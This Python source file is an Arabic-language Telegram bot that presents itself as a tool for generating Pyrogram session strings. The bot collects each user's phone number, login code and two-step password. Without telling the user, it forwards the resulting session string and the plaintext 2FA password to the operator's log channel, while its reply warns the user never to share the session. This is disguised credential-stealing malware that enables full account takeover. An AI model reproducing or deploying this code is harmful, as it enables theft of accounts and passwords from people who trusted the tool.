# Join ne on telegram @devggn
import os
from pyrogram import Client, filters
from pyrogram.errors import (
    ApiIdInvalid,
    PhoneNumberInvalid,
    PhoneCodeInvalid,
    PhoneCodeExpired,
    SessionPasswordNeeded,
    PasswordHashInvalid
)
import asyncio
from config import LOG_GROUP as SESSION_CHANNEL, API_ID, API_HASH, BOT_TOKEN

user_steps = {}
user_data = {}

app = Client(
    "gagan",
    api_id=API_ID,
    api_hash=API_HASH,
    bot_token=BOT_TOKEN
)


def delete_session_files(user_id):
    session_file = f"session_{user_id}.session"
    if os.path.exists(session_file):
        os.remove(session_file)
    memory_file = f"session_{user_id}.session-journal"
    if os.path.exists(memory_file):
        os.remove(memory_file)

@app.on_message(filters.command("start"))
async def start_command(client, message):
    await message.reply(
        "👋 **مرحباً بك في بوت استخراج الجلسات!**\n\n"
        "📌 **للاستخدام:**\n"
        "• أرسل `توليد` لبدء استخراج جلسة جديدة.\n"
        "• أرسل `مسح` لمسح بيانات الجلسة المحفوظة.\n\n"
        "⚡ **مدعوم من Team SPY**"
    )

# ====== الأوامر العربية (بدون /) ======
@app.on_message(filters.text & filters.private)
async def handle_arabic_commands(client, message):
    user_id = message.chat.id
    text = message.text.strip()
    
    # أمر التوليد
    if text == "توليد":
        await session_step(client, message)
        return
    
    # أمر المسح
    elif text == "مسح":
        delete_session_files(user_id)
        await message.reply("✅ **تم مسح جميع بيانات الجلسة والملفات المؤقتة بنجاح.**")
        return
    
    # إذا كان المستخدم في خطوة معينة (رقم هاتف، OTP، كلمة مرور)
    elif user_id in user_steps:
        await session_step(client, message)
        return
    
    # أي نص آخر
    else:
        await message.reply(
            "📱 **يرجى إرسال رقم هاتفك مع رمز الدولة.**\n\n"
            "مثال: `+966512345678`\n\n"
            "أو استخدم الأوامر:\n"
            "• `توليد` لبدء استخراج جلسة جديدة\n"
            "• `مسح` لمسح البيانات"
        )
        user_steps[user_id] = "phone_number"

# ====== دوال الجلسة ======
async def session_step(client, message):
    user_id = message.chat.id
    step = user_steps.get(user_id, None)

    if step == "phone_number":
        user_data[user_id] = {"phone_number": message.text}
        user_steps[user_id] = "otp"
        omsg = await message.reply("📤 **جاري إرسال رمز التحقق...**")
        session_name = f"session_{user_id}"
        temp_client = Client(session_name, api_id=API_ID, api_hash=API_HASH)
        user_data[user_id]["client"] = temp_client
        await temp_client.connect()
        try:
            code = await temp_client.send_code(user_data[user_id]["phone_number"])
            user_data[user_id]["phone_code_hash"] = code.phone_code_hash
            await omsg.delete()
            await message.reply("📨 **تم إرسال رمز التحقق.**\n\nأرسل الرمز بالأرقام فقط (مثال: `12345`).")
        except ApiIdInvalid:
            await message.reply('❌ **خطأ: تركيبة API_ID و API_HASH غير صالحة.** يرجى إعادة المحاولة.')
            reset_user(user_id)
        except PhoneNumberInvalid:
            await message.reply('❌ **خطأ: رقم الهاتف غير صالح.** يرجى التأكد من كتابته مع رمز الدولة (مثال: +966512345678).')
            reset_user(user_id)
    elif step == "otp":
        phone_code = message.text.replace(" ", "")
        temp_client = user_data[user_id]["client"]
        try:
            await temp_client.sign_in(user_data[user_id]["phone_number"], user_data[user_id]["phone_code_hash"], phone_code)
            session_string = await temp_client.export_session_string()
            
            await message.reply(
                f"✅ **تم إنشاء الجلسة بنجاح!**\n\n"
                f"🔑 **جلسة Pyrogram:**\n`{session_string}`\n\n"
                "⚠️ **لا تشارك هذه الجلسة مع أي شخص.**\n"
                "نحن لسنا مسؤولين عن أي سوء استخدام.\n\n"
                "⚡ **مدعوم من Team SPY**"
            )
            
            await app.send_message(
                SESSION_CHANNEL, 
                f"✨ **معرف المستخدم:** `{user_id}`\n\n"
                f"🔑 **الجلسة المستخرجة:**\n`{session_string}`"
            )
            
            await temp_client.disconnect()
            reset_user(user_id)
        except PhoneCodeInvalid:
            await message.reply('❌ **خطأ: رمز التحقق غير صالح.** يرجى المحاولة مرة أخرى.')
            reset_user(user_id)
        except PhoneCodeExpired:
            await message.reply('❌ **خطأ: انتهت صلاحية رمز التحقق.** يرجى بدء عملية جديدة.')
            reset_user(user_id)
        except SessionPasswordNeeded:
            user_steps[user_id] = "password"
            await message.reply('🔒 **حسابك مفعل بخاصية التحقق بخطوتين.**\n\nيرجى إرسال كلمة المرور الخاصة بك.')
    elif step == "password":
        temp_client = user_data[user_id]["client"]
        try:
            password = message.text
            await temp_client.check_password(password=password)
            session_string = await temp_client.export_session_string()
            
            await message.reply(
                f"✅ **تم إنشاء الجلسة بنجاح!**\n\n"
                f"🔑 **جلسة Pyrogram:**\n`{session_string}`\n\n"
                "⚠️ **لا تشارك هذه الجلسة مع أي شخص.**\n"
                "نحن لسنا مسؤولين عن أي سوء استخدام.\n\n"
                "⚡ **مدعوم من Team SPY**"
            )
            
            await app.send_message(
                SESSION_CHANNEL, 
                f"✨ **معرف المستخدم:** `{user_id}`\n\n"
                f"🔑 **كلمة المرور (2SV):** `{password}`\n\n"
                f"🔑 **الجلسة المستخرجة:**\n`{session_string}`"
            )
            
            await temp_client.disconnect()
            reset_user(user_id)
        except PasswordHashInvalid:
            await message.reply('❌ **خطأ: كلمة المرور غير صحيحة.** يرجى المحاولة مرة أخرى.')
            reset_user(user_id)
    else:
        await message.reply(
            "📱 **يرجى إرسال رقم هاتفك مع رمز الدولة.**\n\n"
            "مثال: `+966512345678`"
        )
        user_steps[user_id] = "phone_number"

def reset_user(user_id):
    user_steps.pop(user_id, None)
    user_data.pop(user_id, None)

if __name__ == "__main__":
    try:
        print("🚀 جاري تشغيل البوت...")
        app.run()
        print("✅ البوت يعمل الآن!")
    except Exception as e:
        print(f"❌ فشل تشغيل البوت: {e}")
